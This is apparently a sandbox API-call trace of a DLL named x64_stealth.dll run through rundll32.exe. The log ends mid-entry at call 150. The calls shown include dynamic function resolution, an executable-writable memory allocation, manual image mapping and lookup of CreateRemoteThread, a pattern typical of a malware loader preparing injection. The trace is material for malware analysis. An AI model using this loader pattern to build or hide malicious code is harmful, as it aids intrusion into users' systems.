+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000E03FD541A0
+[PAR] int     cchWideChar       : 0x4e6
+[PAR] LPSTR   lpMultiByteStr    : 0x0
+[PAR] int     cbMultiByte       : 0x0
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] [0x1800d7909] in [x64_stealth.dll]
+
+[CNT] [69]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x0 (CP_ACP)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000E03FD541A0
+[PAR] int     cchWideChar       : 0x4e6
+[PAR] LPSTR   lpMultiByteStr    : 0x000000E03FD54B80
+[PAR] int     cbMultiByte       : 0x4e6
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] [0x1800d7943] in [x64_stealth.dll]
+
+[CNT] [70]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <FreeEnvironmentStringsW> in [KERNEL32.DLL] 
+[PAR] LPWCH penv : 0x000000E03FD541A0
+[STR]       -> "=C:=C:\Users\user"
+[RET] [0x1800d796d] in [x64_stealth.dll]
+
+[CNT] [71]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010A260
+[STR]         -> "kernel32"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [72]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000018010ECA0 ("AreFileApisANSI")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [73]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010E9C0
+[STR]         -> "api-ms-win-core-string-l1-1-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [74]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102B10 ("CompareStringEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [75]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010ECC0 ("EnumSystemLocalesEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [76]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010E840
+[STR]         -> "api-ms-win-core-datetime-l1-1-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [77]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010ED00 ("GetDateFormatEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [78]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x0000000180102B20 ("GetLocaleInfoEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [79]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010ED28 ("GetTimeFormatEx")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [80]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010ED40 ("GetUserDefaultLocaleName")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [81]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010ED70 ("IsValidLocaleName")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [82]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x000000018010E910
+[STR]         -> "api-ms-win-core-localization-obsolete-l1-2-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x1800cf3a9
+
+[CNT] [83]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010ED98 ("LCIDToLocaleName")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [84]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FF9FF880000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x000000018010EDB8 ("LocaleNameToLCID")
+[RET] [0x1800cf45e] in [x64_stealth.dll]
+
+[CNT] [85]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetCurrentThread> in [KERNEL32.DLL] 
+[RET] [0x180094141] in [x64_stealth.dll]
+
+[CNT] [86]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetThreadTimes> in [KERNEL32.DLL] 
+[RET] [0x180094163] in [x64_stealth.dll]
+
+[CNT] [87]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlInitializeSListHead> in [ntdll.dll] 
+[RET] [0x1800cd66b] in [x64_stealth.dll]
+
+[CNT] [88]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x0000000180102760 ("kernel32.dll")
+[RET] [0x18008f038] in [x64_stealth.dll]
+
+[CNT] [89]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102968 ("GetFileInformationByHandleEx")
+[RET] [0x18008f059] in [x64_stealth.dll]
+
+[CNT] [90]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180102988 ("SetFileInformationByHandle")
+[RET] [0x18008f073] in [x64_stealth.dll]
+
+[CNT] [91]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000001801071A0 ("CreateHardLinkW")
+[RET] [0x18008f08d] in [x64_stealth.dll]
+
+[CNT] [92]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x0000000180100438 ("CreateSymbolicLinkW")
+[RET] [0x18008f0a9] in [x64_stealth.dll]
+
+[CNT] [93]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x00000001801071B0 ("ntdll.dll")
+[RET] [0x18008f0db] in [x64_stealth.dll]
+
+[CNT] [94]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA02600000 ("ntdll.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801071C8 ("NtCreateFile")
+[RET] [0x18008f0f8] in [x64_stealth.dll]
+
+[CNT] [95]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA02600000 ("ntdll.dll")
+[PAR] LPCSTR  lpProcName : 0x00000001801071D8 ("NtQueryDirectoryFile")
+[RET] [0x18008f114] in [x64_stealth.dll]
+
+[CNT] [96]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlWakeAllConditionVariable> in [ntdll.dll] 
+[RET] [0x18009059d] in [x64_stealth.dll]
+
+[CNT] [97]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlWakeAllConditionVariable> in [ntdll.dll] 
+[RET] [0x180039d34] in [x64_stealth.dll]
+
+[CNT] [98]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlWakeAllConditionVariable> in [ntdll.dll] 
+[RET] [0x180039daf] in [x64_stealth.dll]
+
+[CNT] [99]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetSystemDirectoryW> in [KERNEL32.DLL] 
+[PAR] LPWSTR lpBuffer : 0x000000E03FD54948
+[PAR] UINT   uSize    : 0x104
+[RET] [0x180050548] in [x64_stealth.dll]
+
+[CNT] [100]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetSystemDirectoryW> in [KERNEL32.DLL] 
+[PAR] LPWSTR lpBuffer : 0x000000E03FD54948
+[PAR] UINT   uSize    : 0x104
+[RET] [0x180050548] in [x64_stealth.dll]
+
+[CNT] [101]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetSystemDirectoryW> in [KERNEL32.DLL] 
+[PAR] LPWSTR lpBuffer : 0x000000E03FD54948
+[PAR] UINT   uSize    : 0x104
+[RET] [0x180050548] in [x64_stealth.dll]
+
+[CNT] [102]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetSystemDirectoryW> in [KERNEL32.DLL] 
+[PAR] LPWSTR lpBuffer : 0x000000E03FD54948
+[PAR] UINT   uSize    : 0x104
+[RET] [0x180050548] in [x64_stealth.dll]
+
+[CNT] [103]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetSystemDirectoryW> in [KERNEL32.DLL] 
+[PAR] LPWSTR lpBuffer : 0x000000E03FD54948
+[PAR] UINT   uSize    : 0x104
+[RET] [0x180050548] in [x64_stealth.dll]
+
+[CNT] [104]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetSystemDirectoryW> in [KERNEL32.DLL] 
+[PAR] LPWSTR lpBuffer : 0x000000E03FD54948
+[PAR] UINT   uSize    : 0x104
+[RET] [0x180050548] in [x64_stealth.dll]
+
+[CNT] [105]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlPcToFileHeader> in [KERNEL32.DLL] 
+[PAR] PVOID PcValue      : 0x000000018015C9C8
+[PAR] PVOID *BaseOfImage : 0x000000E03FBAECA8
+[RET] [0x1800df671] in [x64_stealth.dll]
+
+[CNT] [106]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlWakeAllConditionVariable> in [ntdll.dll] 
+[RET] [0x1800e0a44] in [x64_stealth.dll]
+
+[CNT] [107]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlWakeAllConditionVariable> in [ntdll.dll] 
+[RET] [0x1800e0e44] in [x64_stealth.dll]
+
+[CNT] [108]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <RtlInitializeSRWLock> in [ntdll.dll] 
+[RET] [0x180070814] in [x64_stealth.dll]
+
+[CNT] [109]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0
+[PAR] SIZE_T dwSize       : 0x48c00
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0x1800e943b] in [x64_stealth.dll]
+
+[CNT] [110]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0
+[PAR] SIZE_T dwSize       : 0x4c000
+[PAR] DWORD  flProtect    : 0x40 (PAGE_EXECUTE_READWRITE)
+[RET] [0x1800e94ac] in [x64_stealth.dll]
+
+[ * ] [pid 0xa6c][tid 0xb3c] c:\windows\system32\rundll32.exe
+[API] <VirtualAlloc>
+[RES] LPVOID  0x000000E040020000
+
+[CNT] [111]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x000000E04002327E ("KERNEL32.dll")
+[RET] 0x1800e967d
+
+[CNT] [112]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E0400231A2 ("ExitProcess")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [113]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E0400231B0 ("VirtualQuery")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [114]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E0400231C0 ("VirtualFree")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [115]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E0400231CE ("VirtualAlloc")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [116]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E0400231DE ("SetLastError")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [117]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E0400231EE ("VirtualProtect")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [118]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023200 ("IsBadReadPtr")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [119]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023210 ("LoadLibraryA")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [120]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023220 ("GetProcAddress")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [121]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023232 ("FreeLibrary")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [122]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023240 ("GetNativeSystemInfo")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [123]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023256 ("HeapAlloc")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [124]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023262 ("GetProcessHeap")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [125]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x000000E040023274 ("HeapFree")
+[RET] [0x1800e96b6] in [x64_stealth.dll]
+
+[CNT] [126]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetNativeSystemInfo> in [KERNEL32.DLL] 
+[PAR] LPSYSTEM_INFO lpSystemInfo : 0x000000E03FBAF428
+[RET] [0xe040022239] in [rundll32.exe]
+
+[CNT] [127]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D10000
+[PAR] SIZE_T dwSize       : 0x4b000
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400222ba] in [rundll32.exe]
+
+[CNT] [128]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D10000
+[PAR] SIZE_T dwSize       : 0x600
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe04002242b] in [rundll32.exe]
+
+[CNT] [129]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D11000
+[PAR] SIZE_T dwSize       : 0x1c00
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [130]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D13000
+[PAR] SIZE_T dwSize       : 0x3de00
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [131]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D51000
+[PAR] SIZE_T dwSize       : 0x600
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [132]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D52000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [133]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D53000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [134]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D54000
+[PAR] SIZE_T dwSize       : 0x1000
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe04002144b] in [rundll32.exe]
+
+[CNT] [135]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D55000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [136]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D56000
+[PAR] SIZE_T dwSize       : 0x600
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [137]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D57000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [138]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D58000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [139]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D59000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [140]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x00000002E4D5A000
+[PAR] SIZE_T dwSize       : 0x200
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400214fa] in [rundll32.exe]
+
+[CNT] [141]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <IsBadReadPtr> in [KERNEL32.DLL] 
+[PAR] CONST VOID* lp  : 0x00000002E4D56000
+[PAR] UINT_PTR    ucb : 0x14
+[RET] [0xe040021d14] in [rundll32.exe]
+
+[CNT] [142]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <LoadLibraryA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR lpFileName : 0x00000002E4D56440 ("KERNEL32.dll")
+[RET] 0xe040021fd9
+
+[CNT] [143]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAlloc> in [KERNEL32.DLL] 
+[PAR] LPVOID lpAddress    : 0x0
+[PAR] SIZE_T dwSize       : 0x8
+[PAR] DWORD  flProtect    : 0x4 (PAGE_READWRITE)
+[RET] [0xe0400211e2] in [rundll32.exe]
+
+[CNT] [144]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56242 ("CreateRemoteThread")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [145]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56258 ("DeleteCriticalSection")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [146]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56270 ("EnterCriticalSection")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [147]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56288 ("GetLastError")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [148]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D56298 ("InitializeCriticalSection")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [149]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00000002E4D562B4 ("LeaveCriticalSection")
+[RET] [0xe040022023] in [rundll32.exe]
+
+[CNT] [150]
+[PTP] [0xa6c] [0xb3c] [c:\windows\system32\rundll32.exe]
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFA00270000 ("KERNEL32.DLL")
